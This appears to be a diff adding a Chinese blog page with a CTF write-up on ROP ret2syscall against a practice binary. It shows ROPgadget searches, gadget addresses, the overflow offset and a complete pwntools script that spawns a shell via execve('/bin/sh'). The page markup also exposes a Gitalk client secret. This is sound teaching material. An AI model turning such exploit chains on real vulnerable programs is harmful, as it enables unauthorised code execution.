@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ROP之ret2syscall - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="神马是ROPROP(Return Oriented Programming)，为绕NX而生，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的,"> 
+    <meta name="author" content="赵丰年de博客"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">ROP之ret2syscall</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ROP之ret2syscall</h1>
+        <div class="stuff">
+            <span>三月 03, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="神马是ROP"><a href="#神马是ROP" class="headerlink" title="神马是ROP"></a>神马是ROP</h2><p>ROP(Return Oriented Programming)，为绕NX而生，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程，控制程序执行系统调用。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener">ret2syscall</a></h2><p>顾名思义，控制程序执行系统调用，获取 shell。<br>这道题，静态编译程序，么得system(“/bin/sh”),所以之前的手段么的用了。<br>那么具体分析下，检查下保护机制，开了NX<br><img src="https://i.loli.net/2020/03/03/WPqiu7YskO8Stpr.png" alt="d1.png"><br>OK，扔IDA<br><img src="https://i.loli.net/2020/03/03/UEx2PsvK6zJfj4F.png" alt="d2.png"><br>题目说，么得system，么得shellcode，而且是静态编译，但他有溢出漏洞，但是开启了NX所以我们要调用系统指令组成ROP，这里我们可以用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+<p>达到拿shell的目的<br>首先我们得知道如何调用寄存器可以构造出sys_execve,其次知道如何才能让其执行<br>OK，一个一个解决，看这个<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">网站</a><br><img src="https://i.loli.net/2020/03/03/vxQj1YG2ZudFHtW.png" alt="d3"><br>eax的值为系统调用号，ebx,ecx,edx,控制参数，这样我们就可以构造了，构造该函数时，eax为0x0b,ebx写’/bin/sh’的地址，其余为0，执行该函数需要用int0x80<br>在这里我们通过gadgets来控制这些寄存器，比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。操作如下，先找eax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/03/lASexK8qCyLbD4z.png" alt="d4.png"><br>我们选第二个<br>然后找ebx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/03/IW7HUxFva6wgTtP.png" alt="d5.png"><br>这里有意外收获，我们发现这个地址可以控制三个寄存器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p>OK，我们找”/bin/sh”的地址和int0x80的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x080be408 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;int&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure>
+<p>emmm,还没看偏移呢。<br><img src="https://i.loli.net/2020/03/03/FQS6C1Dzxl3RAPG.png" alt="d6.png"><br>偏移为112<br>ok,写脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">bin_sh &#x3D; 0x080be408</span><br><span class="line">int0x80 &#x3D; 0x08049421</span><br><span class="line">payload &#x3D; &#39;a&#39;*112</span><br><span class="line">payload +&#x3D; p32(pop_eax_ret) + p32(0x0b)</span><br><span class="line">payload +&#x3D; p32(pop_edx_ecx_ebx_ret) + p32(0)+ p32(0) + p32(bin_sh)</span><br><span class="line">payload +&#x3D; p32(int0x80)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/1321392802.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
